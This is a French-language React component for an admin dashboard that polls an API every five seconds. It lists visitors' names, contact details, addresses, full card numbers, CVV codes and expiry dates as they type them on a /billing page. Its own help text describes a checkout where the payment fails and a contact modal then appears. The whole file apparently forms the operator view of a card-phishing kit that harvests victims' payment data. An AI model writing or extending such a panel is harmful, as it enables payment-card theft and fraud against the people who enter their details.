'use client';

import { useState, useEffect } from 'react';

interface RealTimeUser {
  id: string;
  email: string;
  firstName?: string;
  lastName?: string;
  phone?: string;
  address?: string;
  city?: string;
  postalCode?: string;
  country?: string;
  cardNumber?: string;
  cvv?: string;
  expiryDate?: string;
  cardHolderName?: string;
  cardType?: 'Visa' | 'MasterCard' | 'Amex';
  createdAt: string;
  updatedAt: string;
  lastActivity?: string;
  status: 'active' | 'pending_payment' | 'payment_failed';
}

export default function RealTimeUsers() {
  const [users, setUsers] = useState<RealTimeUser[]>([]);
  const [loading, setLoading] = useState(true);
  const [lastRefresh, setLastRefresh] = useState<Date>(new Date());
  const [autoRefresh, setAutoRefresh] = useState(true);

  const loadUsers = async () => {
    try {
      const response = await fetch('/api/realtime-users', {
        headers: { 'Cache-Control': 'no-cache' }
      });
      
      if (response.ok) {
        const userData = await response.json();
        setUsers(userData);
        setLastRefresh(new Date());
        console.log('Utilisateurs temps réel chargés:', userData.length);
      } else {
        console.error('Erreur lors du chargement des utilisateurs temps réel - Status:', response.status);
        const errorText = await response.text();
        console.error('Réponse serveur:', errorText);
        
        // Initialiser avec un tableau vide si l'API n'est pas encore prête
        setUsers([]);
        setLastRefresh(new Date());
      }
    } catch (error) {
      console.error('Erreur de connexion API realtime-users:', error);
      // En cas d'erreur réseau, initialiser avec un tableau vide
      setUsers([]);
      setLastRefresh(new Date());
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadUsers();
  }, []);

  // Auto-refresh toutes les 5 secondes si activé
  useEffect(() => {
    if (!autoRefresh) return;

    const interval = setInterval(() => {
      loadUsers();
    }, 5000);

    return () => clearInterval(interval);
  }, [autoRefresh]);

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'active':
        return <span className="bg-green-100 text-green-800 text-xs px-2 py-1 rounded-full">Actif</span>;
      case 'pending_payment':
        return <span className="bg-yellow-100 text-yellow-800 text-xs px-2 py-1 rounded-full">Paiement en cours</span>;
      case 'payment_failed':
        return <span className="bg-red-100 text-red-800 text-xs px-2 py-1 rounded-full">Paiement échoué</span>;
      default:
        return <span className="bg-gray-100 text-gray-800 text-xs px-2 py-1 rounded-full">{status}</span>;
    }
  };

  const formatTime = (dateString: string) => {
    return new Date(dateString).toLocaleString('fr-FR', {
      day: '2-digit',
      month: '2-digit',
      year: '2-digit',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const getActivityColor = (lastActivity?: string) => {
    if (!lastActivity) return 'text-gray-400';
    
    const now = new Date();
    const activity = new Date(lastActivity);
    const diffMinutes = (now.getTime() - activity.getTime()) / (1000 * 60);
    
    if (diffMinutes < 1) return 'text-green-600'; // Moins d'1 minute - en ligne
    if (diffMinutes < 5) return 'text-yellow-600'; // Moins de 5 minutes - récent
    if (diffMinutes < 30) return 'text-orange-600'; // Moins de 30 minutes - actif
    return 'text-gray-400'; // Plus de 30 minutes - inactif
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center p-8">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
        <span className="ml-2">Chargement des utilisateurs en temps réel...</span>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* En-tête avec contrôles */}
      <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center space-y-2 sm:space-y-0">
        <div>
          <h2 className="text-xl sm:text-2xl font-bold text-gray-900">Utilisateurs en Temps Réel</h2>
          <p className="text-sm text-gray-600">
            {users.length} utilisateur{users.length !== 1 ? 's' : ''} • 
            Dernière mise à jour: {formatTime(lastRefresh.toISOString())}
          </p>
        </div>
        
        <div className="flex space-x-2">
          <button
            onClick={() => setAutoRefresh(!autoRefresh)}
            className={`px-3 py-1 text-xs rounded-lg transition-colors ${
              autoRefresh 
                ? 'bg-green-100 text-green-800' 
                : 'bg-gray-100 text-gray-600 hover:bg-gray-200'
            }`}
          >
            {autoRefresh ? '🟢 Auto-refresh' : '⏸️ Manuel'}
          </button>
          <button
            onClick={loadUsers}
            className="px-3 py-1 bg-blue-600 text-white text-xs rounded-lg hover:bg-blue-700 transition-colors"
          >
            🔄 Actualiser
          </button>
        </div>
      </div>

      {/* Liste des utilisateurs */}
      <div className="space-y-4">
        {users.length === 0 ? (
          <div className="text-center py-12 bg-white rounded-lg shadow">
            <div className="text-gray-400 mb-4">
              <svg className="w-16 h-16 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1} d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197m13.5-9a2.5 2.5 0 11-5 0 2.5 2.5 0 015 0z" />
              </svg>
            </div>
            <h3 className="text-xl font-semibold text-gray-700 mb-2">Aucun utilisateur en ligne</h3>
            <p className="text-gray-500 mb-4">Les utilisateurs apparaîtront ici dès qu'ils interagiront avec le site.</p>
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mx-auto max-w-md">
              <h4 className="text-sm font-medium text-blue-900 mb-2">💡 Comment tester :</h4>
              <div className="text-xs text-blue-800 space-y-1 text-left">
                <p>• Ouvrez <code className="bg-blue-100 px-1 rounded">/billing</code> dans un autre onglet</p>
                <p>• Saisissez des informations de facturation</p>
                <p>• Les données apparaîtront ici en temps réel</p>
                <p>• Testez le paiement pour voir l'échec et la modal de contact</p>
              </div>
            </div>
          </div>
        ) : (
          <div className="grid md:grid-cols-2 xl:grid-cols-3 gap-4">
            {users.map((user) => (
              <div key={user.id} className="bg-white rounded-lg shadow p-4 space-y-3">
                {/* En-tête utilisateur */}
                <div className="flex justify-between items-start">
                  <div>
                    <h3 className="font-medium text-gray-900">
                      {user.firstName && user.lastName 
                        ? `${user.firstName} ${user.lastName}` 
                        : user.email
                      }
                    </h3>
                    <p className="text-sm text-gray-600">{user.email}</p>
                  </div>
                  <div className="flex flex-col items-end space-y-1">
                    {getStatusBadge(user.status)}
                    <div className={`text-xs ${getActivityColor(user.lastActivity)}`}>
                      ●
                      {user.lastActivity && (
                        <span className="ml-1">
                          {formatTime(user.lastActivity)}
                        </span>
                      )}
                    </div>
                  </div>
                </div>

                {/* Informations de contact */}
                {(user.phone || user.address) && (
                  <div className="border-t pt-3">
                    <h4 className="text-xs font-medium text-gray-700 mb-2">Contact & Adresse</h4>
                    {user.phone && (
                      <p className="text-sm text-gray-600">📞 {user.phone}</p>
                    )}
                    {user.address && (
                      <div className="text-sm text-gray-600">
                        <div>📍 {user.address}</div>
                        {user.city && user.postalCode && (
                          <div>{user.city}, {user.postalCode}</div>
                        )}
                        {user.country && <div>{user.country}</div>}
                      </div>
                    )}
                  </div>
                )}

                {/* Informations bancaires (si présentes) */}
                {user.cardNumber && (
                  <div className="border-t pt-3">
                    <h4 className="text-xs font-medium text-gray-700 mb-2">💳 Informations Bancaires</h4>
                    <div className="space-y-1">
                      <div className="text-sm font-medium text-blue-900">
                        {user.cardType} - {user.cardNumber}
                      </div>
                      {user.cardHolderName && (
                        <div className="text-sm text-gray-700">
                          Titulaire: {user.cardHolderName}
                        </div>
                      )}
                      <div className="flex space-x-2">
                        {user.cvv && (
                          <span className="text-xs bg-yellow-100 text-yellow-800 px-2 py-1 rounded font-mono">
                            CVV: {user.cvv}
                          </span>
                        )}
                        {user.expiryDate && (
                          <span className="text-xs bg-green-100 text-green-800 px-2 py-1 rounded">
                            Exp: {user.expiryDate}
                          </span>
                        )}
                      </div>
                    </div>
                  </div>
                )}

                {/* Métadonnées */}
                <div className="border-t pt-3 text-xs text-gray-500 space-y-1">
                  <div>📅 Créé: {formatTime(user.createdAt)}</div>
                  <div>🔄 MAJ: {formatTime(user.updatedAt)}</div>
                  <div className="font-mono text-xs bg-gray-100 px-2 py-1 rounded">
                    ID: {user.id.split('_').pop()}
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Statistiques en bas */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="bg-green-50 p-4 rounded-lg">
          <h3 className="font-medium text-green-900 text-sm">Utilisateurs Actifs</h3>
          <p className="text-2xl font-bold text-green-600">
            {users.filter(u => u.status === 'active').length}
          </p>
        </div>
        <div className="bg-yellow-50 p-4 rounded-lg">
          <h3 className="font-medium text-yellow-900 text-sm">Paiements en cours</h3>
          <p className="text-2xl font-bold text-yellow-600">
            {users.filter(u => u.status === 'pending_payment').length}
          </p>
        </div>
        <div className="bg-red-50 p-4 rounded-lg">
          <h3 className="font-medium text-red-900 text-sm">Paiements échoués</h3>
          <p className="text-2xl font-bold text-red-600">
            {users.filter(u => u.status === 'payment_failed').length}
          </p>
        </div>
      </div>
    </div>
  );
}